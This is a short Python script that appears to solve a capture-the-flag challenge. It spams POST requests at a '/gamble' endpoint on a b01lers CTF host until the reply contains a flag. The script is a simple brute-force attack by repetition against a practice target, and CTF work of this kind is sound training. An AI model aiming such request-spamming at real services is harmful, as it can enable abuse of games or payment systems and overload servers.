#!/usr/bin/env python3
import requests
import time

# Replace with the real host & port
BASE = "https://when.atreides.b01lersc.tf"
URL  = BASE + "/gamble"

def try_until_win(sleep: float = 0.5):
    """POST /gamble repeatedly until the response JSON has a 'flag' key."""
    while True:
        r = requests.post(URL)
        r.raise_for_status()
        data = r.json()

        if data.get("success") is not True:
            print("Server error:", data.get("error", "<no message>"))
            time.sleep(sleep)
            continue

        if "flag" in data:
            print("\n🎉  YOU WON!  🎉")
            print("Flag is:", data["flag"])
            return

        # Optional: show your progress a bit
        print(".", end="", flush=True)
        time.sleep(sleep)

if __name__ == "__main__":
    print("Spamming /gamble until we hit the jackpot…")
    try_until_win()
